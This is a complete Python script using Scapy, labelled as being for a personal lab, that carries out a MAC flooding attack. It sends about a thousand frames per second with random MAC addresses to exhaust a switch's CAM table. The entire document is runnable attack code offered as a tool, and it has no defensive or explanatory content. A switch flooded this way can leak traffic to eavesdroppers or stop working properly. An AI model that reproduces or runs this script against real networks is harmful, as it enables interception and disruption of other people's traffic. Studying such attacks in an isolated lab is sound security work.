#!/usr/bin/env python3
"""
MAC Flooding Attack
Autor  : Edgardy Olivero 20250704
Lab    : EGALDITO_LAB
Uso    : sudo python3 mac_flood.py
"""

from scapy.all import *
import random, time, sys, os, signal

IFACE = "eth0"  # interfaz directa, sin subinterfaz
INTERVALO = 0.001  # 1ms entre paquetes = ~1000 pkt/s

enviados = [0]
stop_flag = False


def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(6)
    )


def cleanup(sig=None, frame=None):
    global stop_flag
    stop_flag = True
    print(f"\n[+] Detenido.")
    print(f"[+] Frames enviados: {enviados[0]}")
    sys.exit(0)


if os.geteuid() != 0:
    sys.exit("Ejecutar como root.")

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

print("=" * 45)
print("  MAC Flooding - Lab EGALDITO_LAB")
print(f"  Interfaz : {IFACE}")
print(f"  Velocidad: {int(1 / INTERVALO)} frames/seg")
print("  Ctrl+C para detener")
print("=" * 45 + "\n")

print("[*] Inundando tabla CAM del switch...\n")

try:
    while not stop_flag:
        src = rand_mac()
        dst = rand_mac()
        sendp(
            Ether(src=src, dst=dst)
            / IP(src="1.1.1.1", dst="2.2.2.2")
            / UDP(sport=1234, dport=4321)
            / Raw(load="X" * 18),  # padding mínimo
            iface=IFACE,
            verbose=False,
        )
        enviados[0] += 1
        if enviados[0] % 500 == 0:
            print(f"\r[*] Frames enviados: {enviados[0]}", end="", flush=True)
        time.sleep(INTERVALO)
except KeyboardInterrupt:
    cleanup()
